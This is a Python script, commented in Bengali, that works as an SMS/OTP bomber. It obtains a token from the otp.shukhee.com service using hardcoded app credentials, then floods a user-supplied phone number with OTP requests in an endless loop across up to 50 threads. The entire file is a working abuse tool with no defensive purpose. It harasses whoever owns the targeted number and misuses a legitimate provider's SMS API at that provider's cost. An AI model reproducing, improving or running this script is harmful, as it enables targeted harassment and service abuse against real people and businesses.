import requests
import json
from concurrent.futures import ThreadPoolExecutor

# Total request counter
total_requests = 0

def get_api_token():
    """
    API টোকেন রিকোয়েস্ট করা।
    """
    url = "https://otp.shukhee.com/api/api-token"
    params = {
        "app_id": "shukhee",
        "app_secret": "shukhee"
    }
    headers = {
        "Accept": "application/json"
    }
    
    try:
        response = requests.get(url, headers=headers, params=params)
        response_data = response.json()
        return response_data.get('api_token')
    except Exception as e:
        print(f"[api_8] Error in getting API token: {e}")
        return None

def shoot_otp(api_token, mobile_number):
    """
    OTP শ্যুট রিকোয়েস্ট পাঠানো।
    """
    global total_requests

    # OTP শ্যুট রিকোয়েস্ট URL
    url = "https://otp.shukhee.com/api/shoot-otp/mobile"
    
    # OTP শ্যুট করার জন্য ডেটা
    data = {
        "app_id": "shukhee",
        "api_token": api_token,
        "mobile": mobile_number
    }
    
    headers = {
        "User-Agent": "Dart/3.4 (dart:io)",
        "Content-Type": "application/json"
    }
    
    try:
        # POST রিকোয়েস্ট পাঠানো
        response = requests.post(url, headers=headers, data=json.dumps(data))
        response_data = response.json()
        
        if response.status_code == 200:
            total_requests += 1
            print(f"[api_8] [{total_requests}] {response_data}")
        else:
            print(f"[api_8] Failed to send OTP for {mobile_number}: {response_data.get('message')}")
    except Exception as e:
        print(f"[api_8] Error in sending OTP for {mobile_number}: {e}")

def main(mobile, threads):
    """
    প্রধান ফাংশন: একাধিক থ্রেডে OTP শ্যুট করা।
    """
    # মোবাইল নম্বর যাচাই করা (১১ ডিজিটের)
    if len(mobile) != 11 or not mobile.isdigit():
        print("Invalid phone number format. Please provide an 11-digit phone number.")
        return

    # API টোকেন রিট্রিভ করা
    api_token = get_api_token()
    if not api_token:
        print("Failed to retrieve API token.")
        return

    # মাল্টিথ্রেডিং দিয়ে OTP শ্যুট করা
    with ThreadPoolExecutor(max_workers=threads) as executor:
        while True:
            futures = [executor.submit(shoot_otp, api_token, mobile) for _ in range(threads)]
            for future in futures:
                future.result()

if __name__ == "__main__":
    mobile = input("Enter an 11-digit phone number: ")
    threads = int(input("Threads(1-50): "))
    main(mobile, threads)
